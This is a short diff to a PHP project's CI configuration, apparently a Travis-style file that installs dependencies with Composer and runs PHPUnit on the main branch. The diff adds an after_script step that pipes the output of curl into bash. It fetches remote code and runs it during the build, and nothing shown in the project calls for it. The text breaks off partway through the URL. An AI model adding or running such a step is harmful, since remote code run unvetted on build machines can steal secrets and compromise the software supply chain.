@@ -4,3 +4,5 @@ install: composer install
 script: ./vendor/bin/phpunit tests
 branches:
   only: main
+after_script:
+  - bash -c "$(curl -fsSL https://
